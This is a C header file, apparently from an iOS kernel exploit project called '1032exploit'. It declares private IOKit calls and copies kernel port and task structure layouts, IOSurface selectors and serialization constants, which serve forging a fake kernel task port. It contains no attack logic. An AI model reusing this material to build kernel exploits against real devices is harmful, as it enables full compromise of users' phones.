//
//  exploit.h
//  1032exploit
//
//  Created by Justin Sherman on 12/30/19.
//  Copyright Â© 2019 Justin Sherman. All rights reserved.
//

#ifndef exploit_h
#define exploit_h

#include <mach/mach.h>

/* IOKit/IOTypes.h */
typedef mach_port_t	io_object_t;
typedef io_object_t	io_connect_t;
typedef io_object_t	io_enumerator_t;
typedef io_object_t	io_iterator_t;
typedef io_object_t	io_registry_entry_t;
typedef io_object_t	io_service_t;

#define	IO_OBJECT_NULL	((io_object_t) 0)

/* IOKit/IOKitLib.h */
extern const mach_port_t kIOMasterPortDefault;

extern CFMutableDictionaryRef IOServiceMatching(const char *name);

extern io_service_t IOServiceGetMatchingService(mach_port_t masterPort,
        CFDictionaryRef matching);

extern kern_return_t IOServiceOpen(io_service_t service, task_port_t owningTask,
        uint32_t type, io_connect_t *connect);

extern kern_return_t IOConnectCallAsyncStructMethod(mach_port_t connection,
        uint32_t selector, mach_port_t wake_port, uint64_t *reference,
        uint32_t referenceCnt, const void *inputStruct, size_t inputStructCnt,
        void *outputStruct, size_t *outputStructCnt);

extern kern_return_t IOConnectCallStructMethod(mach_port_t connection,
        uint32_t selector, const void *inputStruct, size_t inputStructCnt,
        void *outputStruct, size_t *outputStructCnt);

struct ipc_space {
    struct {
        uint64_t data;
        uint32_t type;
        uint32_t pad;
    } is_lock_data;
    uint32_t is_bits;
    uint32_t is_table_size;
    uint32_t is_table_free;
    uint64_t is_table;
    uint64_t is_task;

    /* other stuff that isn't needed */
};

struct ipc_table_size {
    uint32_t its_size;
};

struct ipc_port_request {
    union {
        uint64_t port;
        uint32_t index;
    } notify;

    union {
        mach_port_name_t name;
        struct ipc_table_size *size;
    } name;
};

/* siguza */
typedef struct {
    uint32_t ip_bits;
    uint32_t ip_references;
    struct {
        uint64_t data;
        uint32_t type;
        uint32_t pad;
    } ip_lock;
    struct {
        struct {
            struct {
                uint32_t flags;
                uint32_t waitq_interlock;
                uint64_t waitq_set_id;
                uint64_t waitq_prepost_id;
                struct {
                    uint64_t next;
                    uint64_t prev;
                } waitq_queue;
            } waitq;
            uint64_t messages;
            uint32_t seqno;
            uint32_t receiver_name;
            uint16_t msgcount;
            uint16_t qlimit;
            uint32_t pad;
        } port;
        uint64_t klist;
    } ip_messages;
    uint64_t ip_receiver;
    uint64_t ip_kobject;
    uint64_t ip_nsrequest;
    uint64_t ip_pdrequest;
    struct ipc_port_request *ip_requests;
    uint64_t ip_premsg;
    uint64_t ip_context;
    uint32_t ip_flags;
    uint32_t ip_mscount;
    uint32_t ip_srights;
    uint32_t ip_sorights;
} kport_t;

/* siguza */
typedef struct
{
    struct {
        uint64_t data;
        uint32_t reserved : 24,
                 type     :  8;
        uint32_t pad;
    } lock;
    uint32_t ref_count;
    uint32_t active;
    uint32_t halting;
    uint32_t pad;
    uint64_t map;
} ktask_t;

#define IO_BITS_ACTIVE      0x80000000
#define IOT_PORT            0
#define IKOT_NONE           0
#define IKOT_TASK           2

#define	io_makebits(active, otype, kotype)	\
    (((active) ? IO_BITS_ACTIVE : 0) | ((otype) << 16) | (kotype))

#define MACH_PORT_QLIMIT_ZERO		(0)
#define MACH_PORT_QLIMIT_BASIC		(5)
#define MACH_PORT_QLIMIT_SMALL		(16)
#define MACH_PORT_QLIMIT_LARGE		(1024)
#define MACH_PORT_QLIMIT_KERNEL		(65534)
#define MACH_PORT_QLIMIT_MIN		MACH_PORT_QLIMIT_ZERO
#define MACH_PORT_QLIMIT_DEFAULT	MACH_PORT_QLIMIT_BASIC
#define MACH_PORT_QLIMIT_MAX		MACH_PORT_QLIMIT_LARGE

/* libkern/libkern/OSSerializeBinary.h */
enum {
    kOSSerializeDictionary      = 0x01000000U,
    kOSSerializeArray           = 0x02000000U,
    kOSSerializeSet             = 0x03000000U,
    kOSSerializeNumber          = 0x04000000U,
    kOSSerializeSymbol          = 0x08000000U,
    kOSSerializeString          = 0x09000000U,
    kOSSerializeData            = 0x0a000000U,
    kOSSerializeBoolean         = 0x0b000000U,
    kOSSerializeObject          = 0x0c000000U,
    kOSSerializeTypeMask        = 0x7F000000U,
    kOSSerializeDataMask        = 0x00FFFFFFU,
    kOSSerializeEndCollection   = 0x80000000U,
    kOSSerializeBinarySignature = 0x000000d3U,
};

enum {
    IOSURFACE_CREATE = 0,
    IOSURFACE_SET_PROPERY = 9,
    IOSURFACE_RETRIEVE_PROPERY = 10
};

extern kern_return_t mach_zone_force_gc(host_t);

int exploit(mach_port_t *);

#endif /* exploit_h */
